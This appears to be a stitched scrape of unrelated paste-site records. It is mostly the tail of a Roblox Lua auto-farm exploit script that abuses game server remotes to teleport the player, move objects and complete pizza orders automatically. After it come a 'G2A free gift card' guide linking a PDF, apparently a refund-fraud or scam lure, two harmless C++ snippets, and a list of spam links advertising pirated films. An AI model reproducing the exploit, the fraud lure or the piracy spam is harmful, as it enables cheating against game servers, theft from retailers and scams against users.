	cashierSlider:TweenPosition(UDim2.new(doCashier and 0.5 or 0,2,0,2),nil,""Sine"",0.1,true)
end
local function toggleCook(bool)
	if bool~=nil then
		doCook=bool
	else
		doCook = not doCook
	end
	cookSlider:TweenPosition(UDim2.new(doCook and 0.5 or 0,2,0,2),nil,""Sine"",0.1,true)
end
local function toggleBoxer(bool)
	if bool~=nil then
		doBoxer=bool
	else
		doBoxer = not doBoxer
	end
	boxerSlider:TweenPosition(UDim2.new(doBoxer and 0.5 or 0,2,0,2),nil,""Sine"",0.1,true)
end
local function toggleDelivery(bool)
	if bool~=nil then
		doDelivery=bool
	else
		doDelivery = not doDelivery
	end
	deliverySlider:TweenPosition(UDim2.new(doDelivery and 0.5 or 0,2,0,2),nil,""Sine"",0.1,true)
end
local function toggleSupplier(bool)
	if bool~=nil then
		doSupplier=bool
	else
		doSupplier = not doSupplier
	end
	supplierSlider:TweenPosition(UDim2.new(doSupplier and 0.5 or 0,2,0,2),nil,""Sine"",0.1,true)
end
cashierBtn.MouseButton1Click:Connect(toggleCashier)
cookBtn.MouseButton1Click:Connect(toggleCook)
boxerBtn.MouseButton1Click:Connect(toggleBoxer)
deliveryBtn.MouseButton1Click:Connect(toggleDelivery)
supplierBtn.MouseButton1Click:Connect(toggleSupplier)
allOffBtn.InputBegan:Connect(function()
	if game:GetService(""UserInputService""):IsMouseButtonPressed(Enum.UserInputType.MouseButton1) then
		toggleCashier(false)
		toggleCook(false)
		toggleBoxer(false)
		toggleDelivery(false)
		toggleSupplier(false)
		toggleAllSlider:TweenPosition(UDim2.new(0,0,0,-2),nil,""Sine"",0.1,true)
		wait(1)
		if toggleAllSlider.Position.X.Scale<.01 then
			toggleAllSlider:TweenPosition(UDim2.new(0.45,0,0,-2),nil,""Sine"",0.1,true)
		end
	end
end)
allOnBtn.InputBegan:Connect(function()
	if game:GetService(""UserInputService""):IsMouseButtonPressed(Enum.UserInputType.MouseButton1) then
		toggleCashier(true)
		toggleCook(true)
		toggleBoxer(true)
		toggleDelivery(true)
		toggleSupplier(true)
		toggleAllSlider:TweenPosition(UDim2.new(0.9,0,0,-2),nil,""Sine"",0.1,true)
		wait(1)
		if toggleAllSlider.Position.X.Scale>.88 then
			toggleAllSlider:TweenPosition(UDim2.new(0.45,0,0,-2),nil,""Sine"",0.1,true)
		end
	end
end)
local oldRefillAt=refillAtBox.Text
refillAtBox:GetPropertyChangedSignal(""Text""):Connect(function()
	if #refillAtBox.Text>2 or refillAtBox.Text:match(""%D"") then
		refillAtBox.Text = oldRefillAt
	end
	oldRefillAt = refillAtBox.Text
end)
refillAtBox.FocusLost:Connect(function()
	if tonumber(refillAtBox.Text) then
		settings.refill_at=tonumber(refillAtBox.Text)
	end
	refillAtBox.Text=tostring(settings.refill_at)
end)
local oldRefillEnd=refillEndBox.Text
refillEndBox:GetPropertyChangedSignal(""Text""):Connect(function()
	if #refillEndBox.Text>2 or refillEndBox.Text:match(""%D"") then
		refillEndBox.Text = oldRefillEnd
	end
	oldRefillEnd = refillEndBox.Text
end)
refillEndBox.FocusLost:Connect(function()
	if tonumber(refillEndBox.Text) then
		settings.refill_end=tonumber(refillEndBox.Text)
	end
	refillEndBox.Text=tostring(settings.refill_end)
end)
local oldDeliverAt=deliverAtBox.Text
deliverAtBox:GetPropertyChangedSignal(""Text""):Connect(function()
	if #deliverAtBox.Text>2 or deliverAtBox.Text:match(""%D"") then
		deliverAtBox.Text = oldDeliverAt
	end
	oldDeliverAt = deliverAtBox.Text
end)
deliverAtBox.FocusLost:Connect(function()
	if tonumber(deliverAtBox.Text) then
		settings.deliver_at=tonumber(deliverAtBox.Text)
	end
	deliverAtBox.Text=tostring(settings.deliver_at)
end)
closeBtn.MouseButton1Click:Connect(function()
    gui:Destroy()
    doCashier,doBoxer,doCook,doSupplier,doDelivery = false,false,false,false,false
end)
closeBtn.MouseEnter:Connect(function() closeBtn.TextColor3=Color3.new(.9,0,0) end)
closeBtn.MouseLeave:Connect(function() closeBtn.TextColor3=Color3.new(1,1,1) end)
saveBtn.MouseButton1Click:Connect(function()
	if writefile and messageLbl.Visible==false then
		writefile(""PizzaFarm.txt"",game:GetService(""HttpService""):JSONEncode(settings))
		messageLbl.Visible=true
		wait(2)
		messageLbl.Visible=false
	end
end)
local cameraArray = {CFrame.new(23,14,65,0.629,0.386,-0.674,-0,0.867,0.497,0.777,-0.313,0.545),CFrame.new(39,15,83,-0.571,0.392,-0.720,-0,0.878,0.478,0.820,0.273,-0.502),CFrame.new(40,20,-38,-0.801,-0.229,0.552,-0,0.923,0.384,-0.598,0.307,-0.739),CFrame.new(51,15,-25,-0.707,0.338,-0.620,0,0.878,0.478,0.707,0.338,-0.620),CFrame.new(47,12,21,0.026,0.323,-0.945,-0,0.946,0.323,0.999,-0.008,0.024)}
local cameraIndex = 0
centerCamBtn.MouseButton1Click:Connect(function()
	cameraIndex = 0
	workspace.CurrentCamera.CameraType = ""Custom""
end)
leftCamBtn.MouseButton1Click:Connect(function()
	cameraIndex = cameraIndex - 1
	if cameraIndex < 0 then
		cameraIndex = #cameraArray
	end
	if cameraIndex == 0 then
		workspace.CurrentCamera.CameraType=""Custom""
	else
		local cf = cameraArray[cameraIndex]
		workspace.CurrentCamera.CameraType=""Scriptable""
		workspace.CurrentCamera:Interpolate(cf,cf+cf.lookVector*10,0.5)
	end
end)
rightCamBtn.MouseButton1Click:Connect(function()
	cameraIndex = cameraIndex + 1
	if cameraIndex > #cameraArray then
		cameraIndex = 0
		workspace.CurrentCamera.CameraType=""Custom""
	else
		local cf = cameraArray[cameraIndex]
		workspace.CurrentCamera.CameraType=""Scriptable""
		workspace.CurrentCamera:Interpolate(cf,cf+cf.lookVector*10,0.5)
	end
end)

--//subroutines
local supplyCounts = {TomatoSauce=99,Cheese=99,Sausage=99,Pepperoni=99,Dough=99,Box=99,Dew=99}
for name in pairs(supplyCounts) do
	local lbl = workspace.SupplyCounters.Model[name==""Dew"" and ""CounterMountainDew"" or ""Counter""..name].a.SG.Counter
	supplyCounts[name]=tonumber(lbl.Text)
	lbl.Changed:Connect(function()
		supplyCounts[name]=tonumber(lbl.Text)
	end)
end

local function FindFirstCustomer()
	local children = workspace.Customers:GetChildren()
	for i=1,#children do
		local c = children[i]
		if ffc(c,""Head"") and ffc(c,""Humanoid"") and c.Head.CFrame.Z<102 and ffc(c.Head,""Dialog"") and ffc(c.Head.Dialog,""Correct"") and ((c.Humanoid.SeatPart and c.Humanoid.SeatPart.Anchored) or (c.Humanoid.SeatPart==nil and (c.Head.Velocity.Z^2)^.5<.0001)) then
			local dialog = c.Head.Dialog.Correct.ResponseDialog or ''
			local order = ""MountainDew""
			if dialog:sub(-8)==""instead."" then
				dialog = dialog:sub(-30)
			end
			if dialog:find(""pepperoni"",1,true) then
				order = ""PepperoniPizza""
			elseif dialog:find(""sausage"",1,true) then
				order = ""SausagePizza""
			elseif dialog:find(""cheese"",1,true) then
				order = ""CheesePizza""
			end
			return c,order
		end
	end
end

local boxPtick=0
local boxDtick=0
local function FindBoxes()
	local c,o,f
	local children = workspace.AllBox:GetChildren()
	for i=1,#children do
		local b = children[i]
		if ffc(b,""HasPizzaInside"") or ffc(b,""Pizza"") then
			if c==nil and b.Name==""BoxClosed"" and b.Anchored==false and not b.HasPizzaInside.Value then
				c=b
			elseif o==nil and b.Name==""BoxOpen"" and b.Anchored==false and not b.Pizza.Value then
				o=b
			elseif f==nil and (b.Name==""BoxOpen"" and b.Pizza.Value) or (b.Name==""BoxClosed"" and b.HasPizzaInside.Value) then
				f=b
			end
			if c and o and f then
				return c,o,f
			end
		end
	end
	return c,o,f
end
local function FindBoxingFoods()
	local p,d
	local children = workspace.BoxingRoom:GetChildren()
	for i=1,#children do
		local f = children[i]
		if not f.Anchored then
			if p==nil and f.Name==""Pizza"" then
				p=f
			elseif d==nil and f.Name==""Dew"" then
				d=f
			end
			if p and d then
				return p,d
			end
		end
	end
	return p,d
end

local orderDict={[""3540529228""]=""Cheese"",[""3540530535""]=""Sausage"",[""3540529917""]=""Pepperoni"",[""2512571151""]=""Dew"",[""2512441325""]=""Dew""}
local cookingDict = {Cheese=0,Sausage=0,Pepperoni=0,Dew=0}
local cookPtick=0
local cookDtick=0
local cookWarned=false
local boxerWarned=false
local function getOrders()
	local orders={}
	local tempCookingDict = {}
	for i,v in pairs(cookingDict) do tempCookingDict[i]=v end
	local children = workspace.Orders:GetChildren()
	for i=1,#children do
		local o = orderDict[children[i].SG.ImageLabel.Image:match(""%d+$"")]
		if o then
			if tempCookingDict[o]>0 then
				--ignores oven pizzas, so new orders are priority
				tempCookingDict[o]=tempCookingDict[o]-1
			elseif (o==""Dew"" and #workspace.AllMountainDew:GetChildren()>0) or (supplyCounts[o]>0 and supplyCounts.TomatoSauce>0 and supplyCounts.Cheese>0) then
				--need supplies
				orders[#orders+1]=o
			end
		end
	end
	return orders
end
local function FindFirstDew()
	local children = workspace.AllMountainDew:GetChildren()
	for i=1,#children do
		local d = children[i]
		if (ffc(d,""IsBurned"")==nil or d.IsBurned.Value==false) and not d.Anchored then
			return d
		end
	end
end
local function FindBadDew()
	local children = workspace.AllMountainDew:GetChildren()
	for i=1,#children do
		local d = children[i]
		if (ffc(d,""IsBurned"")==nil or d.IsBurned.Value==false) and d.Position.X > 53 and d.Position.Z > 50 and not d.Anchored then
			return d
		end
	end
end
local function FindDoughAndWithout(str)
	local goodraw,p,raw,trash
	local children = workspace.AllDough:GetChildren()
	for i = #children, 2, -1 do --shuffle
		local j = RNG:NextInteger(1, i)
		children[j], children[i] = children[i], children[j]
	end
	for i=1,#children do
		local d = children[i]
		if d.Anchored==false and #d:GetChildren()>9 then
			if d.IsBurned.Value or d.HasBugs.Value or d.Cold.Value or (d.BrickColor.Name==""Bright orange"" and ffc(d,""XBillboard"")) then
				if trash==nil and d.Position.Y > 0 and ((d.Position*Vector3.new(1,0,1))-Vector3.new(47.90, 0, 72.49)).Magnitude > 1 then
					trash=d
				end
			elseif p==nil and d.BrickColor.Name==""Bright orange"" then
				p=d
			elseif goodraw==nil and d.Position.X<55 and d.BrickColor.Name==""Brick yellow"" and ((str and not ffc(d.SG.Frame,str)) or (str==nil and ffc(d.SG.Frame,""Sausage"")==nil and ffc(d.SG.Frame,""Pepperoni"")==nil)) then
				--prefers flat
				if d.Mesh.Scale.Y<1.1 then
					goodraw=d
				else
					raw=d
				end
			end
			if goodraw and p and trash then
				return goodraw,p,trash
			end
		end
	end
	return goodraw or raw,p,trash
end
local function getOvenNear(pos)
	local children = workspace.Ovens:GetChildren()
	for i=1,#children do
		if ffc(children[i],""Bottom"") and (children[i].Bottom.Position-pos).magnitude < 1.5 then
			return children[i]
		end
	end
end
local function getDoughNear(pos)
	local children = workspace.AllDough:GetChildren()
	for i=1,#children do
		if (children[i].Position-pos).magnitude < 1.5 then
			return children[i]
		end
	end
end
local function isFullyOpen(oven)
	return oven.IsOpen.Value==true and (oven.Door.Meter.RotVelocity.Z^2)^.5<.0001
end

local bcolorToSupply = {[""Dark orange""]=""Sausage"",[""Bright blue""]=""Pepperoni"",[""Bright yellow""]=""Cheese"",[""Bright red""]=""TomatoSauce"",[""Dark green""]=""Dew"",[""Brick yellow""]=""Dough"",[""Light stone grey""]=""Box"",[""Really black""]=""Dew""}
local supplyButtons = {}
for i,v in ipairs(workspace.SupplyButtons:GetChildren()) do
	supplyButtons[i] = v.Unpressed
end
table.sort(supplyButtons,function(a,b) return a.Position.X < b.Position.X end)
local delTick = 0
local function FindAllDeliveryTools(parent)
	local t = {}
	local children = parent:GetChildren()
	for i=1,#children do
		local v = children[i]
		if v.ClassName==""Tool"" and v.Name:match(""^%u%d$"") and ffc(v,""Handle"") and ffc(v,""House"") and (parent~=workspace or (v.Handle.Position-Vector3.new(54.45, 4.02, -16.56)).Magnitude < 30) then
			t[#t+1] = v
		end
	end
	return t
end
local function getHousePart(address)
    local houses = workspace.Houses:GetChildren()
    for i=1,#houses do
        local h = houses[i]
        if ffc(h,""Address"") and h.Address.Value==address and ffc(h,""GivePizza"",true) then
            return ffc(h,""GivePizza"",true)
        end
    end
end
local function onCharacterAdded(char)
	if not char then return end
	character=char
	root = character:WaitForChild(""HumanoidRootPart"")
	humanoid = character:WaitForChild(""Humanoid"")
	humanoid:SetStateEnabled(""FallingDown"",false)
end
onCharacterAdded(player.Character or player.CharacterAdded:Wait())
player.CharacterAdded:Connect(onCharacterAdded)

local function smoothTP2(cf)
	local cf0 = (cf-cf.p) + root.Position + Vector3.new(0,4,0)
	local diff = cf.p - root.Position
	local oldg = workspace.Gravity
	workspace.Gravity = 0
	for i=0,diff.Magnitude,99 do
		humanoid.Sit=false
		root.CFrame = cf0 + diff.Unit * i
		root.Velocity,root.RotVelocity=Vector3.new(),Vector3.new()
		wait()
	end
	root.CFrame = cf
	workspace.Gravity = oldg
end
local function smoothTP(cf)
    if (cf.p-root.Position).Magnitude > 99 then
        local btns = workspace.JobButtons:GetChildren()
        if player:FindFirstChild(""House"") and player.House.Value then
            btns[#btns+1] = player.House.Value:FindFirstChild(""Marker"") 
        end
        table.sort(btns,function(a,b) return (a.Position-cf.p).Magnitude < (b.Position-cf.p).Magnitude end)
        if (btns[1].Position-cf.p).Magnitude < (cf.p-root.Position).Magnitude then
            game:GetService(""ReplicatedStorage"").PlayerChannel:FireServer(""TeleportToJob"", ((btns[1].Name == ""Marker"") and ""House"" or btns[1].Name))
            wait(0.7)
            if (cf.p-root.Position).Magnitude < 8 then
                return
            end
        end
    end
    smoothTP2(cf)
end
for _,o in ipairs(workspace.Ovens:GetChildren()) do
	if ffc(o,""Bottom"") then
		o.Bottom.CanTouch = false
	end
end
local function tryCook()
	for zz=1,18 do
		local order = getOrders()[1]
		local topping
		if order==""Pepperoni"" or order==""Sausage"" then topping=order end
		local cookD = FindFirstDew()
		local badD = FindBadDew()
		local raw,cookP,trash
		if topping then
			--pepperoni order avoids sausage dough and vice verca
			raw,cookP,trash = FindDoughAndWithout(topping==""Pepperoni"" and ""Sausage"" or ""Pepperoni"")
		else
			raw,cookP,trash = FindDoughAndWithout()
		end
		local ovens = workspace.Ovens:GetChildren()
		for i=#ovens,1,-1 do
		    if #ovens[i]:GetChildren() < 10 then
		        table.remove(ovens,i)
		    end
		end
		for i = #ovens, 2, -1 do --shuffle
			local j = RNG:NextInteger(1, i)
			ovens[j], ovens[i] = ovens[i], ovens[j]
		end
		if doCook then
			local didsomething=false
			--move final pizza
			if cookP and tick()-cookPtick>0.8 then
				local oven = getOvenNear(cookP.Position)
				if oven==nil or oven.IsOpen.Value then
					cookPtick=tick()
					didsomething=true
					if (root.Position-Vector3.new(36.64, 3.80, 54.11)).magnitude>9 then  smoothTP(CFrame.new(36.64, 3.80, 54.11)) wait(.1) end
					network:FireServer(""UpdateProperty"", cookP, ""CFrame"", CFrame.new(RNG:NextNumber(56,57),4.1,38))
				end
			end
			if order then
				if order==""Dew"" and cookD and tick()-cookDtick>0.8 then
					--move dew if ordered
					cookDtick=tick()
					didsomething=true
					if (root.Position-Vector3.new(36.64, 3.80, 54.11)).magnitude>9 then  smoothTP(CFrame.new(36.64, 3.80, 54.11)) wait(.1) end
					network:FireServer(""UpdateProperty"", cookD, ""CFrame"", CFrame.new(53,4.68,36.5))
				elseif order~=""Dew"" and raw and raw.Parent and supplyCounts[order]>0 and supplyCounts.TomatoSauce>0 and supplyCounts.Cheese>0 then
					--make pizza
					if raw.Mesh.Scale.Y>1.5 then
						if (root.Position-Vector3.new(36.64, 3.80, 54.11)).magnitude>9 then  smoothTP(CFrame.new(36.64, 3.80, 54.11)) wait(.1) end
						didsomething=true
						network:FireServer(""UpdateProperty"", raw, ""CFrame"", CFrame.new(RNG:NextNumber(29.6,44.6),3.7,RNG:NextNumber(42.5,48.5)))
						wait()
						network:FireServer(""SquishDough"", raw)
					else
						--make sure it will have an oven
						local oven
						for _,o in ipairs(ovens) do
							if isFullyOpen(o) then
								local other = getDoughNear(o.Bottom.Position)
								if other==nil or not (other.BrickColor.Name==""Bright orange"" and ffc(other.SG.Frame,""TomatoSauce"") and ffc(other.SG.Frame,""MeltedCheese"")) then
									if other then
										--replace mistaken dough
										didsomething=true
										if (root.Position-Vector3.new(36.64, 3.80, 54.11)).magnitude>9 then  smoothTP(CFrame.new(36.64, 3.80, 54.11)) wait(.1) end
										network:FireServer(""UpdateProperty"", other, ""CFrame"", CFrame.new(RNG:NextNumber(29.6,44.6),3.7,RNG:NextNumber(42.5,48.5)))
										wait()
									end
									oven=o
									break
								end
							end
						end
						if oven and raw.Parent==workspace.AllDough then
							--make
							if (root.Position-Vector3.new(36.64, 3.80, 54.11)).magnitude>9 then  smoothTP(CFrame.new(36.64, 3.80, 54.11)) wait(.1) end
							didsomething=true
							network:FireServer(""AddIngredientToPizza"", raw,""TomatoSauce"")
							network:FireServer(""AddIngredientToPizza"", raw,""Cheese"")
							network:FireServer(""AddIngredientToPizza"", raw,topping)
							network:FireServer(""UpdateProperty"", raw, ""CFrame"", oven.Bottom.CFrame+Vector3.new(0,0.7,0))
							oven.Door.ClickDetector.Detector:FireServer()
							--mark as cooking
							cookingDict[order]=cookingDict[order]+1
							local revoked=false
							spawn(function()
								raw.AncestryChanged:Wait()
								if not revoked then
									cookingDict[order]=cookingDict[order]-1
									revoked=true
								end
							end)
							delay(40, function()
								if not revoked then
									cookingDict[order]=cookingDict[order]-1
									revoked=true
								end
							end)
						end
					end
				end
			end
			--open unnecessarily closed ovens
			for _,o in ipairs(ovens) do
				local bar = o.Door.Meter.SurfaceGui.ProgressBar.Bar
				if o.IsOpen.Value==false and (o.IsCooking.Value==false or (Vector3.new(bar.ImageColor3.r,bar.ImageColor3.g,bar.ImageColor3.b)-Vector3.new(.871,.518,.224)).magnitude>.1) then
					didsomething=true
					if (root.Position-Vector3.new(36.64, 3.80, 54.11)).magnitude>9 then  smoothTP(CFrame.new(36.64, 3.80, 54.11)) wait(.1) end
					o.Door.ClickDetector.Detector:FireServer()
					break
				end
			end
			--trash
			if badD then
				didsomething=true
				if (root.Position-Vector3.new(36.64, 3.80, 54.11)).magnitude>9 then  smoothTP(CFrame.new(36.64, 3.80, 54.11)) wait(.1) end
				network:FireServer(""UpdateProperty"", badD, ""CFrame"", CFrame.new(RNG:NextNumber(28,30), 1.7, RNG:NextNumber(55,57)))
			end
			if trash and (trash.IsBurned.Value==false or getOvenNear(trash.Position)==nil or getOvenNear(trash.Position).IsOpen.Value) then
				--closed oven breaks if you take burnt out of it
				didsomething=true
				if (root.Position-Vector3.new(36.64, 3.80, 54.11)).magnitude>9 then  smoothTP(CFrame.new(36.64, 3.80, 54.11)) wait(.1) end
				network:FireServer(""UpdateProperty"", trash, ""CFrame"", CFrame.new(47.90, 7.00, 72.49, 1, 0, -0, 0, 0, 1, 0, -1, 0))
			end
			if didsomething then wait(0.5) else break end
		else
			break
		end
	end
end
wait(1)
--//main loop
while gui.Parent do
	wait(0.9)
	humanoid.Sit=false
	if RNG:NextInteger(1,20)==1 then
        game:GetService(""VirtualInputManager""):SendKeyEvent(true,""Z"",false,game)
        wait()
        game:GetService(""VirtualInputManager""):SendKeyEvent(false,""Z"",false,game)
	end
	for zz=1,3 do
		local c,order = FindFirstCustomer()
		if doCashier and c and order then
			local reg = 3
			if c.Head.Position.X < 50 then
			    reg = 2
			elseif c.Head.Position.X < 70 then
			    reg = 1
			end
			if (root.Position-Vector3.new(50.30, 3.80, 83.24)).magnitude>9 then smoothTP(CFrame.new(50.30, 3.80, 83.24)) wait(.1) end
			network:FireServer(""OrderComplete"", c, order, workspace[""Register""..reg])
			wait(0.3)
		else
			break
		end
	end
	tryCook()
	for zz=1,7 do
		if doBoxer then
			local didsomething = false
			local boxP,boxD = FindBoxingFoods()
			local closedBox,openBox,fullBox = FindBoxes()
			if boxD and tick()-boxDtick>0.8 then
				boxDtick=tick()
				didsomething=true
				if (root.Position-Vector3.new(58.74, 3.80, 12.400)).magnitude>9 then  smoothTP(CFrame.new(58.74, 3.80, 12.40))wait(.1) continue end
				network:FireServer(""UpdateProperty"", boxD, ""CFrame"", CFrame.new(63,4.9,-1,-1,0,0,0,1,0,0,0,-1))
			end
			if fullBox then
				if fullBox.Name==""BoxOpen"" then
					didsomething=true
					if (root.Position-Vector3.new(58.74, 3.80, 12.400)).magnitude>9 then  smoothTP(CFrame.new(58.74, 3.80, 12.40))wait(.1) continue end
					network:FireServer(""CloseBox"", fullBox)
					--will be moved next loop
				elseif tick()-boxPtick>0.8 then
					didsomething=true
					if (root.Position-Vector3.new(58.74, 3.80, 12.400)).magnitude>9 then  smoothTP(CFrame.new(58.74, 3.80, 12.40))wait(.1) continue end
					network:FireServer(""UpdateProperty"", fullBox, ""CFrame"", CFrame.new(68.2,4.4,RNG:NextNumber(-3,-2),-1,0,0,0,1,0,0,0,-1))
					boxPtick=tick()
				end
			end
			if closedBox and not openBox then
				didsomething=true
				if (root.Position-Vector3.new(58.74, 3.80, 12.400)).magnitude>9 then  smoothTP(CFrame.new(58.74, 3.80, 12.40))wait(.1) continue end
				network:FireServer(""UpdateProperty"", closedBox, ""CFrame"", CFrame.new(RNG:NextNumber(62.5,70.5),3.5,RNG:NextNumber(11,25)))
				wait()
				network:FireServer(""OpenBox"", closedBox)
			end
			if openBox and boxP then
				didsomething=true
				if (root.Position-Vector3.new(58.74, 3.80, 12.400)).magnitude>9 then  smoothTP(CFrame.new(58.74, 3.80, 12.40))wait(.1) continue end
				network:FireServer(""UpdateProperty"", boxP, ""Anchored"", true)
				network:FireServer(""UpdateProperty"", openBox, ""Anchored"", true)
				wait()
				network:FireServer(""UpdateProperty"", boxP, ""CFrame"", openBox.CFrame+Vector3.new(0,-2,0))
				wait()
				network:FireServer(""AssignPizzaToBox"", openBox, boxP)
			end
			if didsomething then wait(0.5) else break end
		else
			break
		end
	end
	if doDelivery then
		local wstools = FindAllDeliveryTools(workspace)
		if #wstools > 1 or (wstools[1] and ffc(wstools[1].Handle,""X10"")) then
			--get tools
			if (root.Position-Vector3.new(54.45, 4.02, -15)).magnitude>9 then smoothTP(CFrame.new(54.45, 4.02, -15)) wait(.1) end
			for i=1,#wstools do
				if wstools[i].Parent == workspace then
					humanoid:EquipTool(wstools[i])
					wait()
				end
			end
			wait(0.3)
			local t = FindAllDeliveryTools(character)
    		for i=1,#t do
    			t[i].Parent = player.Backpack
    		end
    		wait(0.1)
    		if ffc(character,""RightHand"") and ffc(character.RightHand,""RightGrip"") then
    			character.RightHand.RightGrip:Destroy()
    		end
		end
		local bptools = FindAllDeliveryTools(player.Backpack)
		if #bptools >= settings.deliver_at and #bptools > 0 and tick()-delTick > 30 then
			--deliver to houses
			table.sort(bptools,function(a,b)
				a,b=tostring(a),tostring(b)
				if (a:sub(1,1)==""B"" and b:sub(1,1)==""B"") then
					return a < b
				end
				return a > b
			end)
			local fatass=false
			for i=1,#bptools do
				if not doDelivery then
					break
				end
				humanoid.Sit=false
				local tool = bptools[i]
				local giver = getHousePart(tool.Name)
				local ogp = giver.Position
				if giver then
					if (giver.Position-root.Position).Magnitude > 9 then
						smoothTP(giver.CFrame+Vector3.new(0,7,0))
						if giver.Parent==nil or (giver.Position-ogp).Magnitude>1 then
							giver = getHousePart(tool.Name) or giver
							smoothTP(giver.CFrame+Vector3.new(0,7,0))
						end
						pcall(function() tool.Parent = character end)
						wait(1.2)
						local t = FindAllDeliveryTools(character)
                		for i=1,#t do
                		    if t[i] ~= tool then
                			    t[i].Parent = player.Backpack
                			end
                		end
						wait(2)
						fatass=false
					else
						if fatass then
							wait(0.2)
						else
							wait(0.7)
						end
						pcall(function() tool.Parent = character end)
						wait()
						fatass=true
					end
				end
			end
			delTick = tick()
		end
	end
	tryCook()
	if doSupplier then
		local refill=false
		for s,c in pairs(supplyCounts) do
			if c <= settings.refill_at then
				refill=true
				break
			end
		end
		if refill then
			local oldcf = root.CFrame
			local waiting = false
			local waitingTick = 0
			local lastBox
			while doSupplier do
				--check if refill is done otherwise hit buttons
				local fulfilled=true
				local boxes = workspace.AllSupplyBoxes:GetChildren()
				for yy=1,2 do
				local needtp=true
				local realc = 0
				for _,btn in ipairs(supplyButtons) do
				    local s = bcolorToSupply[btn.BrickColor.Name]
					if supplyCounts[s] < settings.refill_end then
						local count = 0
						if #boxes > 30 then
							for i=1,#boxes do
								local box = boxes[i]
								if bcolorToSupply[box.BrickColor.Name]==s and box.Anchored==false and box.Position.Z < -940 then
									count=count+1
								end
							end
						end
						if count < 2 then
							if needtp then
							    needtp=false
								smoothTP(btn.CFrame + Vector3.new(0,3,2.5))
								wait(0.1)
							end
							if not doSupplier then break end
							root.CFrame = btn.CFrame + Vector3.new(0,3,0)
							wait(0.1)
							realc=realc+1
						end
						fulfilled=false
					end
				end
				wait(0.2)
				if yy == 1 and realc < 3 then
				    wait(0.6)
				end
				end
				if fulfilled or not (doSupplier) then
					break
				end
				smoothTP(CFrame.new(8,12.4,-1020))
				if not doSupplier then break end
				--check if can finish waiting for boxes to move
				if waiting and (lastBox.Position.X>42 or tick()-waitingTick>6) then
					waiting=false
					if lastBox.Position.X<42 then
						--clear boxes if stuck
						smoothTP(CFrame.new(20.5,8,-35))
						wait(0.1)
						local boxes = workspace.AllSupplyBoxes:GetChildren()
						for i=1,#boxes do
							local box = boxes[i]
							if box.Anchored==false and box.Position.Z>-55 then
								network:FireServer(""UpdateProperty"", box, ""CFrame"", CFrame.new(RNG:NextNumber(0,40),RNG:NextNumber(-10,-30),-70))
								wait()
							end
						end
						wait(0.1)
					end
				end
				if not waiting then
					--move boxes
					if root.Position.Z > -900 then smoothTP(CFrame.new(8,12.4,-1020)) end
					wait(0.1)
					lastBox=nil
					local j=0
					local boxes = workspace.AllSupplyBoxes:GetChildren()
					for i=1,#boxes do
						local box = boxes[i]
						if box.Anchored==false and box.Position.Z < -940 and bcolorToSupply[box.BrickColor.Name] and supplyCounts[bcolorToSupply[box.BrickColor.Name]]<settings.refill_end then
							box.CFrame = CFrame.new(38-4.3*math.floor(j/2),5,-7-5*(j%2))
							network:FireServer(""UpdateProperty"", box, ""CFrame"", box.CFrame)
							lastBox=box
							j=j+1
							if j>13 then break end
						end
					end
					if lastBox then
						waiting=true
						waitingTick=tick()
					end
				end
			end
			--smoothTP(oldcf)
		end
	end
end"
tNdGGydy,🤑 G2A.com Free Gift Card Guide Mar 2024 FIX 🤑,ounnuo,GetText,Saturday 16th of March 2024 12:12:25 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.

If you use this make sure to use the English version of G2A.com otherwise this will not work!
 
PDF guide here:
https://drive.google.com/file/d/1thJ3r_goEZ3BA-wE8sNYbGUhGv6gTnXz/view?usp=g2a_refund_exploit_918827.pdf

Working as of:
16 March 2024"
LNW9QkpM,reverse a string,BojidarDosev,C++,Saturday 16th of March 2024 11:58:31 AM CDT,"#include <iostream>
#include <vector>
#include <string>
#include <cmath>
#include <algorithm>

using namespace std;

int main()
{
	string str = ""I am Bozhidar dosev."";
	vector<char> data(str.begin(),str.end());
	int a = 0;
	

	for (int i = str.length()-1; i >-1.; i--)
	{
		cout << data[i];
	}
}"
vjgwTPzP,Untitled,Josif_tepe,C++,Saturday 16th of March 2024 11:55:06 AM CDT,"#include <iostream>
#include <cmath>
using namespace std;

int main() {
    int a, b;
    cin >> a >> b;
    int res = 0;
    while(a != b) {
        if(a > b) {
            swap(a, b);
        }
        int koren = sqrt(a);
        int najgolem_delitel = 1;
        for(int i = 2; i <= koren; i++) {
            if(a % i == 0) {
                najgolem_delitel = a / i;
                break;
            }
        }
        int razlika = b - a;
        int kolku_pati = razlika / najgolem_delitel;
        if(razlika % najgolem_delitel > 0) {
            kolku_pati++;
        }
        b -= kolku_pati * najgolem_delitel;
        
        res += kolku_pati;
    }
    cout << res << endl;
    return 0;
}
"
13qV8Tyv,safdvsaerbr,gadungw71,PHP,Saturday 16th of March 2024 11:48:11 AM CDT,"https://techcommunity.microsoft.com/t5/community-events-list/%E5%9C%A8%E7%BA%BF%E8%A7%82%E7%9C%8B-%E6%B2%99%E4%B8%982-2024-%E5%AE%8C%E6%95%B4%E7%89%88-%E9%9B%BB%E5%BD%B1%E2%84%8D%F0%9D%94%BB/m-p/4087292
https://techcommunity.microsoft.com/t5/community-events-list/%E6%B2%99%E4%B8%982-2024-%E5%AE%8C%E6%95%B4%E7%89%88%E6%9C%AC-hd-bd1080p-%E5%85%8D%E8%B2%BB%E4%B8%8B%E8%BC%89-hd/m-p/4087299
https://github.com/2024-EXHUMA-TW
https://github.com/Exhuma-TW-HK
https://github.com/2024-CHINESE-HD-1080P
https://techcommunity.microsoft.com/t5/community-events-list/%E7%A0%B4%E5%A2%93-%E5%AE%8C%E6%95%B4%E7%89%88%E6%9C%AC-2024-%E9%AB%98%E6%B8%85%E7%94%B5%E5%BD%B1-1080p-%E5%AE%8C%E6%95%B4%E7%9A%84%E7%94%B5%E5%BD%B1/m-p/4087324
https://techcommunity.microsoft.com/t5/community-events-list/%E7%A0%B4%E5%A2%93-%E5%AE%8C%E6%95%B4%E7%89%88-2024-%E9%AB%98%E6%B8%85%E7%94%B5%E5%BD%B1-tw-hk-%E5%AE%8C%E6%95%B4%E7%9A%84%E7%94%B5%E5%BD%B1/m-p/4087328
https://techcommunity.microsoft.com/t5/community-events-list/%E7%BA%BF%E4%B8%8A%E7%9C%8B%E5%AE%8C%E6%95%B4%E7%89%88-%E7%A0%B4%E5%A2%93-exhuma-2024-hd%E9%AB%98%E6%B8%85%E7%94%B5%E5%BD%B1/m-p/4087401
